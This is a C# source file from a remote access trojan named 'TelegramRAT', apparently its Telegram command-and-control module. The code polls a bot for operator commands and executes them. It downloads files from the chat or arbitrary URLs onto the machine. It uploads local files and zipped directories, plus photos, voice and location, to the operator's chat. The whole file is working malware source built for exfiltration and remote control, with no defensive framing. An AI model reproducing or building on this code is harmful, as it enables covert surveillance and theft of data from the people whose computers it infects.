using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;
using SimpleJSON;

namespace TelegramRAT
{
    internal class telegram
    {

        // Client
        private static WebClient Bot = new WebClient();
        private static int LastUpdateID = 0;


        // Wait commands
        public static void waitCommands()
        {
            // Get last update id
            string response;
            response = Bot.DownloadString("https://api.telegram.org/bot" + config.TelegramToken + "/getUpdates");
            LastUpdateID = JSON.Parse(response)["result"][0]["update_id"].AsInt;

            // Get commands
            while(true)
            {
                // Sleep
                Thread.Sleep(config.TelegramCommandCheckDelay * 1000);
                // Get commands
                response = Bot.DownloadString("https://api.telegram.org/bot" + config.TelegramToken + "/getUpdates" + "?offset=" + (LastUpdateID + 1));
                var json = JSON.Parse(response);

                foreach (JSONNode r in json["result"].AsArray)
                {
                    JSONNode message = r["message"];
                    string chatid = message["chat"]["id"];
                    LastUpdateID = r["update_id"].AsInt;

                    // If not the creator of the bot writes
                    if (chatid != config.TelegramChatID)
                    {
                        sendText("👑 You not my owner!", chatid);
                    }
                    // Download file from chat to computer
                    if (message.HasKey("document"))
                    {
                        // Get document info
                        string fileName = message["document"]["file_name"];
                        string fileID = message["document"]["file_id"];
                        var filePath = JSON.Parse(Bot.DownloadString(
                            "https://api.telegram.org/bot" +
                            config.TelegramToken +
                            "/getFile" +
                            "?file_id=" + fileID
                        ))["result"]["file_path"];
                        // Download
                        DownloadFile(fileName, filePath);
                    }
                    // Run command
                    else if (message.HasKey("text"))
                    {
                        string command = message["text"];
                        // Check if it's command
                        if (!command.StartsWith("/")) { continue; }
                        // Execute command in new thread
                        Thread t = new Thread(() => commands.handle(command));
                        t.SetApartmentState(ApartmentState.STA);
                        t.Start();
                    } else
                    {
                        sendText("🍩 Unknown type received. Only Text/Document can be used!");
                    }

                }
            }
            
        }

        private static void sendFile(string file, string type = "Document")
        {
            // If is file
            if (!File.Exists(file))
            {
                sendText("⛔ File not found!");
                return;
            }
            // Send file
            HttpClient httpClient = new HttpClient();
            MultipartFormDataContent fform = new MultipartFormDataContent();
            var file_bytes = File.ReadAllBytes(file);
            fform.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), type.ToLower(), file);
            var rresponse = httpClient.PostAsync("https://api.telegram.org/bot" + config.TelegramToken + "/send" + type + "?chat_id=" + config.TelegramChatID, fform);
            rresponse.Wait();
            httpClient.Dispose();
            // string sd = rresponse.Result.Content.ReadAsStringAsync().Result;
            // Console.WriteLine(sd);
        }

        // Send text
        public static void sendText(string text, string chatID = config.TelegramChatID)
        {
            Bot.DownloadString(
                "https://api.telegram.org/bot" +
                config.TelegramToken +
                "/sendMessage" +
                "?chat_id=" + chatID +
                "&text=" + text
            );
        }

        // Send image
        public static void sendImage(string file)
        {
            sendFile(file, "Photo");
        }

        // Send voice
        public static void sendVoice(string file)
        {
            sendFile(file, "Voice");
        }

        // Send location
        public static void sendLocation(float lat, float lon)
        {
            Bot.DownloadString(
                "https://api.telegram.org/bot" +
                config.TelegramToken +
                "/sendLocation" +
                "?chat_id=" + config.TelegramChatID +
                "&latitude=" + lat +
                "&longitude=" + lon
            );
        }
        // Send file from chat/url to computer
        public static void DownloadFile(string file, string path = "")
        {
            // Download file from url
            if(file.StartsWith("http"))
            {
                sendText(String.Format("📄 Downloading file \"{0}\" from url", Path.GetFileName(file)));
                try
                {
                    Bot.DownloadFile(new Uri(file), Path.GetFileName(file));
                } catch
                {
                    sendText(String.Format("💥 Connection error"));
                    return;
                }
                
                sendText(String.Format("💾 File \"{0}\" saved in: \"{1}\"", file, Path.GetFullPath(Path.GetFileName(file))));
            // Download file from chat
            } else
            {
                sendText(String.Format("📄 Downloading file: \"{0}\"", file));
                path = @"https://api.telegram.org/file/bot" + config.TelegramToken + "/" + path;
                Bot.DownloadFile(new Uri(path), file);
                sendText(String.Format("💾 File \"{0}\" saved in: \"{1}\"", file, Path.GetFullPath(file)));
            }   
        }

        // Send file from computer to chat
        public static void UploadFile(string file, bool removeAfterUpload = false)
        {
            // If is file
            if(File.Exists(file))
            {
                sendText("📃 Uploading file...");
                sendFile(file);
                // Remove after uploading
                if(removeAfterUpload)
                {
                    File.Delete(file);
                }
            }
            // If is directory
            else if(Directory.Exists(file))
            {
                sendText("📁 Uploading directory...");
                string zfile = file + ".zip";
                if(File.Exists(zfile))
                { File.Delete(zfile); }
                // Add dir to archive
                System.IO.Compression.ZipFile.CreateFromDirectory(file, zfile);
                // Send archive
                sendFile(zfile);
                // Delete archive
                File.Delete(zfile);
            // If path not exists
            }
            else
            {
                sendText("⛔ File not found!");
                return;
            }   
        }
        
        // Send connected
        public static void sendConnection()
        {
            sendText("🍀 Bot online");
        }

        
    }
}
